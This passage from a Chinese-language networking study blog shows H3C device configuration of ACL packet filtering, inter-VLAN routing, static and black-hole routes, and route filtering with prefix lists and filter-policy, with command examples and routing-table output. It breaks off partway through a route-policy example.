<span id="more"></span>

<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><img src="/1022/1.PNG"></p>
<ul>
<li>对进出的数据包逐个过滤，丢弃或允许通过；</li>
<li>ACL应用于<strong>接口</strong>上，每个接口的出入双向分别过滤；</li>
<li>仅当数据包经过一个接口时，才能被此接口的此方向的ACL过滤。</li>
</ul>
<p>ACL的配置步骤如下：</p>
<ol>
<li>设置包过滤功能的默认过滤规则 </li>
<li>根据需要选择合适的ACL分类</li>
<li>创建正确的规则</li>
</ol>
<ul>
<li>设置匹配条件</li>
<li>设置合适的动作（Permit&#x2F;Deny)</li>
</ul>
<ol start="4">
<li>在路由器的接口上应用ACL，并指明过滤报文的方向（入站&#x2F;出站）</li>
</ol>
<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>ACL利用数字序号标识访问控制列表：</p>
<table>
<thead>
<tr>
<th>访问控制列表的类型</th>
<th>数字序号的范围</th>
</tr>
</thead>
<tbody><tr>
<td>基本访问控制列表</td>
<td>2000～2999</td>
</tr>
<tr>
<td>高级访问控制列表</td>
<td>3000～3999</td>
</tr>
<tr>
<td>基于二层的访问控制列表</td>
<td>4000～4999</td>
</tr>
</tbody></table>
<p>同时也可以给访问控制列表指定名称，便于维护。</p>
<h2 id="基本ACL"><a href="#基本ACL" class="headerlink" title="基本ACL"></a>基本ACL</h2><p>基本访问控制列表只根据报文的源IP地址信息制定规则。</p>
<p><img src="/1022/2.PNG"></p>
<h2 id="高级ACL"><a href="#高级ACL" class="headerlink" title="高级ACL"></a>高级ACL</h2><p>高级访问控制列表根据报文的源IP地址、目的IP地址、IP承载的协议类型、协议特性等三、四层信息制定规则。</p>
<p><img src="/1022/3.PNG"></p>
<h2 id="二层ACL"><a href="#二层ACL" class="headerlink" title="二层ACL"></a>二层ACL</h2><p>二层ACL根据报文的源MAC地址、目的MAC地址、802.1p优先级、二层协议类型等二层信息制定匹配规则。</p>
<p><img src="/1022/4.PNG"></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>使用下面的拓扑图进行连接配置：</p>
<p><img src="/1022/5.PNG"></p>
<h2 id="基本ACL-1"><a href="#基本ACL-1" class="headerlink" title="基本ACL"></a>基本ACL</h2><p>配置基本ACL，禁止PC1的网络：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R1]acl basic 2000</span><br><span class="line">[R1-acl-ipv4-basic-2000]description denyPC1</span><br><span class="line">[R1-acl-ipv4-basic-2000]rule deny source 192.168.0.1 0 //rule编号不指定则从0开始，默认步长为5</span><br><span class="line">[R1-acl-ipv4-basic-2000]quit</span><br><span class="line"></span><br><span class="line">[R1]int g0/0</span><br><span class="line">[R1-GigabitEthernet0/0]packet-filter 2000 inbound //选择离源最近的端口，减少不必要的流量转发</span><br><span class="line"></span><br><span class="line">[R1]dis acl 2000</span><br><span class="line">Basic IPv4 ACL 2000, 1 rule,</span><br><span class="line">denyPC1</span><br><span class="line">ACL&#x27;s step is 5</span><br><span class="line"> rule 0 deny source 192.168.0.1 0 (2 times matched)</span><br></pre></td></tr></table></figure>

<h2 id="高级ACL-1"><a href="#高级ACL-1" class="headerlink" title="高级ACL"></a>高级ACL</h2><p>配置高级ACL，禁止PC2对PC1的ping流量，允许PC2对PC3的ping流量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R1]acl advanced 3000</span><br><span class="line">[R1-acl-ipv4-adv-3000]description PC2icmpMANAGE</span><br><span class="line">[R1-acl-ipv4-adv-3000]rule deny icmp source 192.168.1.1 0 destination 192.168.0.1 0 //rule编号不指定则从0开始，默认步长为5</span><br><span class="line">[R1-acl-ipv4-adv-3000]rule permit icmp source 192.168.1.1 0 destination 192.168.2.1 0</span><br><span class="line">[R1-acl-ipv4-adv-3000]quit</span><br><span class="line"></span><br><span class="line">[R1]int g0/2</span><br><span class="line">[R1-GigabitEthernet0/2]packet-filter 3000 inbound //选择在匹配高级acl中所有规则情况下离源最近的端口，减少不必要的流量转发</span><br><span class="line"></span><br><span class="line">[R1]dis acl 3000</span><br><span class="line">Advanced IPv4 ACL 3000, 2 rules,</span><br><span class="line">PC2icmpMANAGE</span><br><span class="line">ACL&#x27;s step is 5</span><br><span class="line"> rule 0 deny icmp source 192.168.1.1 0 destination 192.168.0.1 0 (3 times matched)</span><br><span class="line"> rule 5 permit icmp source 192.168.1.1 0 destination 192.168.2.1 0 (1 times matched)</span><br></pre></td></tr></table></figure>

<h2 id="二层ACL-1"><a href="#二层ACL-1" class="headerlink" title="二层ACL"></a>二层ACL</h2><p>在拓扑图中串入交换机作为PC3的接入交换机：</p>
<p><img src="/1022/7.PNG"></p>
<p>配置二层ACL，禁止PC3(0884-8ef1-0a06)的流量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW]acl mac 4000</span><br><span class="line">[SW-acl-mac-4000]rule deny source-mac 0884-8ef1-0a06 ffff-ffff-ffff</span><br><span class="line">[SW-acl-mac-4000]quit</span><br><span class="line"></span><br><span class="line">[SW]int g1/0/2</span><br><span class="line">[SW-GigabitEthernet1/0/2]packet-filter mac 4000 inbound</span><br><span class="line"></span><br><span class="line">[SW]dis acl mac 4000</span><br><span class="line">MAC ACL 4000, 1 rule,</span><br><span class="line">ACL&#x27;s step is 5</span><br><span class="line"> rule 0 deny source-mac 0884-8ef1-0a06 ffff-ffff-ffff (2 times matched)</span><br></pre></td></tr></table></figure>

<h2 id="ACL包过滤显示与调试"><a href="#ACL包过滤显示与调试" class="headerlink" title="ACL包过滤显示与调试"></a>ACL包过滤显示与调试</h2><table>
<thead>
<tr>
<th>操作</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>查看包过滤的统计信息</td>
<td><strong>display packet-filter statistics { interface [ interface-type</strong> <em>interface-number</em> <strong>] { inbound \ outbound } {</strong> <em>acl-number</em> <strong>\ name</strong> <em>acl-name</em> <strong>} }</strong></td>
</tr>
<tr>
<td>清除包过滤的统计信息</td>
<td><strong>reset packet-filter statistics { interface [ interface-type</strong> <em>interface-number</em> <strong>] { inbound \ outbound } {</strong> <em>acl-number</em> <strong>\ name</strong> <em>acl-name</em> <strong>} }</strong></td>
</tr>
<tr>
<td>显示配置的<strong>IPv4 ACL</strong>信息</td>
<td><strong>display acl {</strong> <em>acl-number</em> <strong>\ all }</strong></td>
</tr>
<tr>
<td>清除<strong>IPv4  ACL</strong>统计信息</td>
<td><strong>reset acl counter {</strong> <em>acl-number</em> <strong>\ all \ name</strong> <em>acl-name</em> <strong>}</strong></td>
</tr>
</tbody></table>
<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><ol>
<li>包过滤功能默认是开启的，且<strong>系统默认的过滤方式是permit，即允许未匹配上ACL规则的报文通过</strong>，也可以配置包过滤的缺省动作为deny：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C] packet-filter default deny</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>ACL支持两种匹配顺序：</li>
</ol>
<ul>
<li>配置顺序（config）：按照用户配置规则的先后顺序进行规则匹配；</li>
<li>自动排序（auto）：按照“深度优先”的顺序进行规则匹配，即地址范围小的规则被优先进行匹配。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C] acl &#123;basic|advanced&#125; acl-number [ match-order &#123; auto | config &#125; ]</span><br></pre></td></tr></table></figure>

<p>由图可以看出不同的匹配顺序会导致不同的匹配结果：</p>
<p><img src="/1022/6.PNG"></p>
<ol start="3">
<li>可以通过建立时间范围，使acl应用在限定的时间范围内：</li>
</ol>
<ul>
<li>建立时间范围：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C]time-range work 9:00 to 17:30 working-day //工作日</span><br><span class="line">[H3C]time-range breakfast from 08:00 08/02/2019 to 9:00 08/02/2019 //单次</span><br></pre></td></tr></table></figure>

<ul>
<li>应用acl在时间范围内：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C-acl-ipv4-basic-2000]rule deny source 192.168.0.1 0 time-range work</span><br><span class="line"></span><br><span class="line">[H3C-acl-ipv4-basic-2000]dis this</span><br><span class="line">#</span><br><span class="line">acl basic 2000</span><br><span class="line"> rule 0 deny source 192.168.0.1 0 time-range work</span><br><span class="line">#</span><br><span class="line">return</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>尽可能在靠近数据源的路由器接口上配置ACL，以减少不必要的流量转发。</p>
</li>
<li><p>ACL包过滤是根据数据包头中的二、三、四层信息来进行报文过滤的，对应用层的信息无法识别。</p>
</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>H3C X00060100 第27章 用访问控制列表实现包过滤</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>访问控制列表</tag>
        <tag>ACL</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day11 H3C设备配置vlan间路由】</title>
    <url>/1028/</url>
    <content><![CDATA[<p>vlan间路由的实现方法一般有两种：</p>
<ol>
<li>单臂路由器802.1Q和子接口实现VLAN间路由</li>
<li>三层交换机启用内置三层路由转发引擎执行VLAN间路由</li>
</ol>
<p>在H3C模拟器上进行vlan间路由的配置，系统版本v7。</p>
<span id="more"></span>

<h1 id="单臂路由"><a href="#单臂路由" class="headerlink" title="单臂路由"></a>单臂路由</h1><h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p>按照下图拓扑连接，并配置pc端IP地址：</p>
<p><img src="/1028/1.PNG"></p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p><code>SW1</code>上配置vlan10、vlan20，将上联路由器口设为trunk，允许vlan10、vlan20通过：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]vlan 10</span><br><span class="line">[SW1-vlan10]port g1/0/2</span><br><span class="line">[SW1-vlan10]vlan 20</span><br><span class="line">[SW1-vlan20]port g1/0/3</span><br><span class="line">[SW1-vlan20]int g1/0/1</span><br><span class="line">[SW1-GigabitEthernet1/0/1]port link-type trunk</span><br><span class="line">[SW1-GigabitEthernet1/0/1]port trunk permit vlan 10 20</span><br></pre></td></tr></table></figure>

<p><code>R1</code>上配置子接口，封装dot1q协议：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R1]int g0/1.1</span><br><span class="line">[R1-GigabitEthernet0/1.1]ip add 10.0.0.254 24</span><br><span class="line">[R1-GigabitEthernet0/1.1]vlan-type dot1q vid 10</span><br><span class="line">[R1-GigabitEthernet0/1.1]int g0/1.2</span><br><span class="line">[R1-GigabitEthernet0/1.2]ip add 20.0.0.254 24</span><br><span class="line">[R1-GigabitEthernet0/1.2]vlan-type dot1q vid 20</span><br></pre></td></tr></table></figure>

<h1 id="三层交换机"><a href="#三层交换机" class="headerlink" title="三层交换机"></a>三层交换机</h1><h2 id="拓扑-1"><a href="#拓扑-1" class="headerlink" title="拓扑"></a>拓扑</h2><p>拓扑同上，但是不需要路由器<code>R1</code>，直接在<code>SW1</code>上配置vlan虚接口的ip地址即可，H3C交换机默认启用三层路由功能。</p>
<h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]int vlan 10</span><br><span class="line">[SW1-Vlan-interface10]ip add 10.0.0.254 24</span><br><span class="line">[SW1-Vlan-interface10]int vlan 20</span><br><span class="line">[SW1-Vlan-interface20]ip add 20.0.0.254 24</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>H3C X00050002 第22章 直连路由和静态路由</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>单臂路由</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day11 H3C设备配置静态路由】</title>
    <url>/1029/</url>
    <content><![CDATA[<p>在网络中，路由器负责将数据报文在逻辑网段间进行转发，其中路由是指导路由器如何进行数据报文发送的路径信息。</p>
<p>每台路由器都有路由表，路由存储在路由表中。</p>
<p>由手工配置的静态路由，无开销，配置简单，需人工维护，适合简单拓扑结构的网络。</p>
<p>在H3C模拟器上进行静态路由的配置，系统版本v7。</p>
<span id="more"></span>

<h1 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h1><h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p>按照下图拓扑连接，并配置各端口IP地址：</p>
<p><img src="/1029/1.PNG"></p>
<p>一般在拓扑网络内部配置<strong>静态路由</strong>，在网络边界为了省事配置<strong>默认路由</strong>，即目的网段为<strong>0.0.0.0&#x2F;0</strong>的静态路由。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>在<code>R1</code>、<code>R2</code>上配置默认路由，指向下一跳IP地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R1]ip route-static 0.0.0.0 0 12.0.0.2</span><br><span class="line">[R3]ip route-static 0.0.0.0 0 23.0.0.1</span><br></pre></td></tr></table></figure>

<p>在<code>R2</code>上配置非直连的两个网段<strong>10.0.0.0&#x2F;24</strong>、<strong>30.0.0.0&#x2F;24</strong>的静态路由，前者指向下一跳IP地址，<em><strong>后者可以指定下一跳IP地址或者出接口</strong></em>，这里按照出接口配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R2]ip route-static 10.0.0.0 24 12.0.0.1</span><br><span class="line">[R2]ip route-static 30.0.0.0 24 s1/0</span><br></pre></td></tr></table></figure>

<h1 id="路由备份与负载分担"><a href="#路由备份与负载分担" class="headerlink" title="路由备份与负载分担"></a>路由备份与负载分担</h1><ol>
<li>路由备份：</li>
</ol>
<ul>
<li>到相同目的地址的下一跳和优先级都不同</li>
<li>优先级高的为主，低的为备</li>
</ul>
<ol start="2">
<li>负载分担：</li>
</ol>
<ul>
<li>到相同目的地址的下一跳不同，但优先级相同</li>
<li>到目的地的流量将均匀分布</li>
</ul>
<h2 id="拓扑-1"><a href="#拓扑-1" class="headerlink" title="拓扑"></a>拓扑</h2><p>按照下图拓扑连接，并配置各端口IP地址：</p>
<p><img src="/1029/2.PNG"></p>
<h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><p>在<code>RTA</code>上配置到<code>RTB</code>的lo0端口的两条静态路由：</p>
<p>优先级一致时为负载分担：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[RTA]ip route-static 2.2.2.2 32 10.0.0.2 preference 60</span><br><span class="line">[RTA]ip route-static 2.2.2.2 32 20.0.0.2 preference 60</span><br></pre></td></tr></table></figure>

<p>优先级不一致时为路由备份：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[RTA]ip route-static 2.2.2.2 32 10.0.0.2 preference 50 //主</span><br><span class="line">[RTA]ip route-static 2.2.2.2 32 20.0.0.2 preference 100 //备</span><br></pre></td></tr></table></figure>

<h1 id="黑洞路由"><a href="#黑洞路由" class="headerlink" title="黑洞路由"></a>黑洞路由</h1><p>正确的应用黑洞路由可以消除环路。</p>
<h2 id="拓扑-2"><a href="#拓扑-2" class="headerlink" title="拓扑"></a>拓扑</h2><p>按照下图拓扑连接，并配置各端口IP地址：</p>
<p><img src="/1029/3.PNG"></p>
<p>当<strong>10.0.0.0&#x2F;16</strong>网段中掩码24位的子网段很多时（图中只放了两个示例），配置多条静态路由显然很麻烦。这时可在<code>R3</code>上配置一条默认路由作为出口路由，同时搭配一条黑洞路由，避免子网段间访问出现环路。</p>
<h2 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h2><p><code>R4</code>上配置到静态路由：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R4]ip route-static 10.0.0.0 16 20.0.0.1</span><br></pre></td></tr></table></figure>

<p><code>R1</code>、<code>R2</code>上配置缺省路由指向<code>R3</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R1]ip route-static 0.0.0.0 0 10.0.0.2</span><br><span class="line">[R2]ip route-static 0.0.0.0 0 10.0.1.2</span><br></pre></td></tr></table></figure>

<p><code>R3</code>上配置出口缺省路由搭配内部网段黑洞路由：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R3]ip route-static 0.0.0.0 0 20.0.0.2</span><br><span class="line">[R3]ip route-static 10.0.0.0 16 NULL 0</span><br></pre></td></tr></table></figure>

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 若不配置黑洞路由，例如当R2与R3断路后，R1到R2的包会按照缺省路由发往R4，R4又会发回R3，造成环路</span><br><span class="line"></span><br><span class="line">[R1]tracert 10.0.1.1</span><br><span class="line">traceroute to 10.0.1.1 (10.0.1.1), 30 hops at most, 40 bytes each packet, press CTRL_C to break</span><br><span class="line"> 1  10.0.0.2 (10.0.0.2)  1.000 ms  0.000 ms  1.000 ms</span><br><span class="line"> 2  20.0.0.2 (20.0.0.2)  1.000 ms  1.000 ms  1.000 ms</span><br><span class="line"> 3  20.0.0.1 (20.0.0.1)  1.000 ms  1.000 ms  1.000 ms</span><br><span class="line"> 4  20.0.0.2 (20.0.0.2)  1.000 ms  0.000 ms  2.000 ms</span><br><span class="line"> 5  20.0.0.1 (20.0.0.1)  0.000 ms  1.000 ms  1.000 ms</span><br><span class="line"> 6  20.0.0.2 (20.0.0.2)  1.000 ms  1.000 ms  1.000 ms</span><br><span class="line"> 7  20.0.0.1 (20.0.0.1)  2.000 ms  3.000 ms  2.000 ms</span><br><span class="line"> 8  20.0.0.2 (20.0.0.2)  2.000 ms  2.000 ms *</span><br><span class="line"> 9</span><br><span class="line"></span><br><span class="line"># 若配置黑洞路由，当R2与R3断路后，R1到R2的包会直接丢弃</span><br><span class="line"></span><br><span class="line">[R1]tracert 10.0.1.1</span><br><span class="line">traceroute to 10.0.1.1 (10.0.1.1), 30 hops at most, 40 bytes each packet, press CTRL_C to break</span><br><span class="line"> 1  10.0.0.2 (10.0.0.2)  1.000 ms  1.000 ms  0.000 ms</span><br><span class="line"> 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>H3C X00050001 第21章 IP路由原理</li>
<li>H3C X00050002 第22章 直连路由和静态路由</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>静态路由</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day12 H3C设备配置路由过滤】</title>
    <url>/1030/</url>
    <content><![CDATA[<p>路由器在发布与接收路由信息时，可能需要对路由信息进行过滤。</p>
<p>其中常用的路由过滤工具有ACL、地址前缀列表等。</p>
<p>在H3C模拟器上进行路由过滤的配置，包括静默端口、地址前缀列表、filter-policy、Route-policy等，系统版本v7。</p>
<span id="more"></span>

<h1 id="路由过滤"><a href="#路由过滤" class="headerlink" title="路由过滤"></a>路由过滤</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="/1030/1.PNG"></p>
<p>如图在<code>RTB</code>实施路由过滤后，转发向外部的路由条目减少。</p>
<p>路由过滤控制路由的传播与生成，节省设备和链路资源消耗，保护网络安全。</p>
<p>路由过滤常见的方法有以下几点：</p>
<ul>
<li>过滤路由协议报文</li>
<li>过滤路由协议报文中携带的路由信息</li>
<li>对LSDB计算出的路由信息进行过滤</li>
</ul>
<p><img src="/1030/2.PNG"></p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>常用路由过滤工具有以下几种：</p>
<ol>
<li><p>静默端口</p>
</li>
<li><p>过滤器</p>
</li>
</ol>
<ul>
<li><p>访问控制列表</p>
</li>
<li><p>地址前缀列表</p>
</li>
<li><p>filter-policy</p>
</li>
<li><p>Route-policy</p>
</li>
</ul>
<h1 id="静默端口"><a href="#静默端口" class="headerlink" title="静默端口"></a>静默端口</h1><p><img src="/1030/3.PNG"></p>
<p>如上图，在<code>RTB</code>出接口配置静默端口，则过滤全部路由。</p>
<p>需注意rip和ospf中配置静默端口的区别：</p>
<ul>
<li><p>RIP协议中，静默接口不发送路由更新</p>
</li>
<li><p>OSPF协议中，静默接口不发送HELLO报文</p>
</li>
</ul>
<p>配置命令基本一致：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># rip下配置静默端口</span><br><span class="line">[RTB]rip 1</span><br><span class="line">[RTB-rip-1]silent-interface g0/2</span><br><span class="line"></span><br><span class="line"># ospf下配置静默端口</span><br><span class="line">[RTB]ospf 1</span><br><span class="line">[RTB-ospf-1]silent-interface g0/2</span><br></pre></td></tr></table></figure>

<h1 id="地址前缀列表"><a href="#地址前缀列表" class="headerlink" title="地址前缀列表"></a>地址前缀列表</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>地址前缀列表匹配流程：</p>
<p><img src="/1030/4.PNG"></p>
<p>如果所有表项都是deny模式，则任何路由都不能通过该过滤列表。这种情况下，需要在多条deny模式的表项后定义一条<strong>permit 0.0.0.0 0 less-equal 32</strong>表项，允许其它所有IPv4路由信息通过。</p>
<p>配置命令是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C] ip prefix-list prefix-list-name [ index index-number ] &#123; deny | permit &#125; ip-address mask-length [ greater-equal min-mask-length ] [ less-equal max-mask-length ]</span><br></pre></td></tr></table></figure>

<p>需要注意的是：</p>
<ul>
<li><strong>Permit 0.0.0.0 0</strong> 仅匹配缺省路由</li>
<li><strong>Permit 0.0.0.0 0 less-equal 32</strong> 匹配所有路由</li>
</ul>
<h1 id="filter-policy"><a href="#filter-policy" class="headerlink" title="filter-policy"></a>filter-policy</h1><p>通过与ACL、地址前缀列表结合使用，filter-policy可对路由信息进行过滤。</p>
<h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p>按照下图拓扑，连接并配置各端口ip：</p>
<p><img src="/1030/5.PNG"></p>
<p>在各路由器启用rip协议，版本<code>ver 2</code>，并关闭自动聚合功能<code>undo summary</code>。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>两种方式，前缀地址列表、ACL均可以实现。</p>
<h3 id="filter-policy搭配前缀地址列表过滤接收路由"><a href="#filter-policy搭配前缀地址列表过滤接收路由" class="headerlink" title="filter-policy搭配前缀地址列表过滤接收路由"></a>filter-policy搭配前缀地址列表过滤接收路由</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R4]ip prefix-list denyR1 index 10 deny 10.0.1.0 24</span><br><span class="line">[R4]ip prefix-list denyR1 index 100 permit 0.0.0.0 0 less-equal 32</span><br><span class="line"></span><br><span class="line">[R4]rip 1</span><br><span class="line">[R4-rip-1]filter-policy prefix-list denyR1 import //入口方向，配到出口也生效</span><br></pre></td></tr></table></figure>

<h3 id="filter-policy搭配访问控制列表过滤发送路由"><a href="#filter-policy搭配访问控制列表过滤发送路由" class="headerlink" title="filter-policy搭配访问控制列表过滤发送路由"></a>filter-policy搭配访问控制列表过滤发送路由</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R4]acl basic 2000</span><br><span class="line">[R4-acl-ipv4-basic-2000]rule 10 deny source 10.0.1.0 0.0.0.255</span><br><span class="line">[R4-acl-ipv4-basic-2000]rule 100 permit source any</span><br><span class="line">[R4-acl-ipv4-basic-2000]quit</span><br><span class="line"></span><br><span class="line">[R4]rip 1</span><br><span class="line">[R4-rip-1]filter-policy 2000 export //出口方向，配到入口也生效</span><br></pre></td></tr></table></figure>

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>配置前查看<code>R5</code>路由表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R5]dis ip ro</span><br><span class="line"></span><br><span class="line">Destinations : 15       Routes : 15</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">... ...</span><br><span class="line">10.0.1.0/24        RIP     100 2           12.0.0.1        GE0/0 //R1网段</span><br><span class="line">10.0.2.0/24        RIP     100 2           12.0.0.1        GE0/0</span><br><span class="line">11.0.0.0/24        RIP     100 1           12.0.0.1        GE0/0</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure>

<p>配置后查看<code>R5</code>路由表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R5]dis ip ro</span><br><span class="line"></span><br><span class="line">Destinations : 14       Routes : 14</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">... ...</span><br><span class="line">10.0.2.0/24        RIP     100 2           12.0.0.1        GE0/0</span><br><span class="line">11.0.0.0/24        RIP     100 1           12.0.0.1        GE0/0</span><br><span class="line">//R1网段已被过滤</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>用filter-policy过滤OSPF和IS-IS路由的命令与上面类似，但要注意：<strong>filter-policy过滤掉的是计算出的路由，而非LSA。</strong>对OSPF或IS-IS计算出来的路由进行过滤，只有通过过滤的路由才被添加到路由表中。</p>
<h1 id="Route-policy"><a href="#Route-policy" class="headerlink" title="Route-policy"></a>Route-policy</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>路由策略（Routing Policy）是为了改变网络流量所经过的途径而修改路由信息的技术 。</p>
<p>Route-policy是实现路由策略的工具，其作用包括：</p>
<ol>
<li><strong>路由过滤</strong></li>
<li><strong>改变路由信息属性</strong></li>
</ol>
<p>Route-policy匹配流程如下：</p>
<p><img src="/1030/6.PNG"></p>
<ul>
<li><p>节点之间的过滤关系是“<strong>或</strong>”的关系，如果通过了其中一个节点，就意味着通过该路由策略，不再对其他节点进行匹配（配置了continue子句的情况除外）。</p>
</li>
<li><p>节点的if-match子句之间的过滤关系是“<strong>与</strong>”的关系。</p>
</li>
</ul>
<p>Route-policy命令的组成如下图：</p>
<p><img src="/1030/7.PNG"></p>
<p>节点匹配规则与执行动作如下表：</p>
<table>
<thead>
<tr>
<th>匹配规则（if-match）</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>ACL</td>
<td>路由信息的目的IP地址范围的匹配条件</td>
</tr>
<tr>
<td>prefix-list</td>
<td>路由信息的目的IP地址范围的匹配条件</td>
</tr>
<tr>
<td>ip next-hop</td>
<td>路由信息的下一跳地址的匹配条件</td>
</tr>
<tr>
<td>interface</td>
<td>路由信息的出接口的匹配条件</td>
</tr>
<tr>
<td>route-type</td>
<td>路由信息类型的匹配条件</td>
</tr>
<tr>
<td>tag</td>
<td>RIP、OSPF、IS-IS路由信息的标记域的匹配条件</td>
</tr>
<tr>
<td>cost</td>
<td>路由信息的路由开销的匹配条件</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>动作（apply）</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>ip-address  next-hop</td>
<td>设定通过过滤后路由信息的下一跳地址</td>
</tr>
<tr>
<td>preference</td>
<td>设定通过过滤后路由协议的优先级</td>
</tr>
<tr>
<td>tag</td>
<td>设定通过过滤后RIP、OSPF、IS-IS路由信息的标记域</td>
</tr>
<tr>
<td>cost</td>
<td>设定通过过滤后路由信息的路由开销</td>
</tr>
<tr>
<td>cost-type</td>
<td>设定通过过滤后路由信息的路由开销类型</td>
</tr>
</tbody></table>
<h2 id="拓扑-1"><a href="#拓扑-1" class="headerlink" title="拓扑"></a>拓扑</h2><p>按照下图拓扑，连接并配置各端口ip：</p>
<p><img src="/1030/8.PNG"></p>
<p>在路由器<code>RTA</code>、<code>RTB</code>、<code>RTC</code>启用rip协议，版本<code>ver 2</code>，并关闭自动聚合功能<code>undo summary</code>。在路由器<code>RTB</code>、<code>RTC</code>、<code>RTD</code>启用ospf协议，区域<code>area 0</code>。</p>
<h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><h3 id="选择性引入静态路由"><a href="#选择性引入静态路由" class="headerlink" title="选择性引入静态路由"></a>选择性引入静态路由</h3><p>在<code>RTA</code>上配置静态路由并引入rip中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[RTA]ip route-static 10.1.0.0 24 10.0.1.2</span><br><span class="line">[RTA]ip route-static 10.1.1.0 24 10.0.1.2</span><br><span class="line">[RTA]rip 1</span><br><span class="line">[RTA-rip-1]import-route static</span><br><span class="line">[RTA-rip-1]default cost 2</span><br></pre></td></tr></table></figure>

<p>配置完成后在<code>RTB</code>、<code>RTC</code>上查看路由表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[RTB]dis ip routing-table</span><br><span class="line"></span><br><span class="line">Destinations : 20       Routes : 20</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">... ...</span><br><span class="line">10.0.1.0/24        RIP     100 1           192.168.1.1     GE5/0</span><br><span class="line">10.1.0.0/24        RIP     100 3           192.168.1.1     GE5/0</span><br><span class="line">10.1.1.0/24        RIP     100 3           192.168.1.1     GE5/0</span><br><span class="line">192.168.1.4/30     RIP     100 1           192.168.1.1     GE5/0</span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[RTC]dis ip routing-table</span><br><span class="line"></span><br><span 